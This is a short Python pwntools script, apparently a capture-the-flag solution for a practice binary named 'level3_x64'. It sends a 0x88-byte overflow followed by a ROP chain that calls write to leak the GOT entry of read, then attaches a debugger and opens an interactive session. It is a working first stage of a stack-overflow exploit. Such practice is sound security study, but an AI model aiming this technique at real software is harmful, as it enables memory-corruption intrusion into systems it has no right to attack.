#+++++++++++++++++++level3.py++++++++++++++++++++
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: Sun Nov 29 09:06:34 CST 2020
#+++++++++++++++++++level3.py++++++++++++++++++++
from pwn import*

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./level3_x64')
#libc = ELF('null')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

sh = process('./level3_x64')
#sh = remote('ip',port)

rop = ROP(elf)
rop.write(1,elf.got['read'],0x10)

payload = 'A'*0x88 + str(rop)
sh.sendline(payload)
gdb.attach(sh)

sh.interactive()
